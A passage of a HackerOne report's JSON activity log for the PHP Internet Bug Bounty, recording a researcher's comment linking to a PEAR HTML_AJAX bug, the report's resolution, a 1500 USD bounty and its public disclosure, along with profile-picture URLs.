class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-16T13:38:16.082Z","updated_at":"2017-01-16T13:38:16.082Z","actor":{"username":"ryat","cleared":false,"url":"/ryat","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045235Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=3c3a1d284e774549038c269afd698967882318abf58b2998cd8e2b6fc3862c82"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1467228,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Another example of successful exploiting the vulnerability in HTML_AJAX: http://pear.php.net/bugs/bug.php?id=21165","markdown_message":"\u003cp\u003eAnother example of successful exploiting the vulnerability in HTML_AJAX: \u003ca title=\"http://pear.php.net/bugs/bug.php?id=21165\" href=\"/redirect?url=http%3A%2F%2Fpear.php.net%2Fbugs%2Fbug.php%3Fid%3D21165\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://pear.php.net/bugs/bug.php?id=21165\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-07T00:08:20.725Z","updated_at":"2017-02-07T00:08:20.725Z","actor":{"username":"ryat","cleared":false,"url":"/ryat","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045235Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=3c3a1d284e774549038c269afd698967882318abf58b2998cd8e2b6fc3862c82"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1698634,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-24T18:49:05.358Z","updated_at":"2017-05-24T18:49:05.358Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"ryat","url":"/ryat"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1698635,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-24T18:49:13.019Z","updated_at":"2017-05-24T18:49:13.019Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"ryat","url":"/ryat"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025864,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:19:43.621Z","updated_at":"2019-10-13T09:19:43.621Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6026939,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T11:11:07.671Z","updated_at":"2019-10-13T11:11:07.671Z","actor":{"username":"ryat","cleared":false,"url":"/ryat","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045235Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=3c3a1d284e774549038c269afd698967882318abf58b2998cd8e2b6fc3862c82"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026940,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T11:11:07.728Z","updated_at":"2019-10-13T11:11:07.728Z","actor":{"username":"ryat","cleared":false,"url":"/ryat","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045235Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=3c3a1d284e774549038c269afd698967882318abf58b2998cd8e2b6fc3862c82"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}